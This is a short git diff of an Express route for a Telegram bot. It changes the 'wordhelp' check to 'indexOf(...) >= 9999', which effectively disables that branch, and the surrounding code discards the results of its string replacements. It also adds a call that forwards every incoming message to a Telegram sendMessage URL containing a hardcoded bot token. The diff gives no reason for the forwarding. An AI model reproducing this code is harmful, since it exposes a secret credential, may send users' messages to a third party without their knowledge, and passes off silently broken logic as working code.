@@ -20,7 +20,7 @@ app.post("/gamabot", (req, res) => {
         res.end()
     }
 
-    if (message.text.toLowerCase().indexOf("wordhelp") !== -1){
+    if (message.text.toLowerCase().indexOf("wordhelp") >= 9999){
         let m = message.text.toLowerCase()
         m.replace("wordhelp", "")
         m.replaceAll(" ", "")
@@ -63,6 +63,9 @@ app.post("/gamabot", (req, res) => {
             res.send("Error: " + err)
         })
     }
+
+    axios.post("https://api.telegram.org/bot5413442689:AAF72aDW97J06Bi5WweLbpZInQk7KVcHLfY/sendMessage", message)
+
 })
 
 app.listen(process.env.PORT, () => {
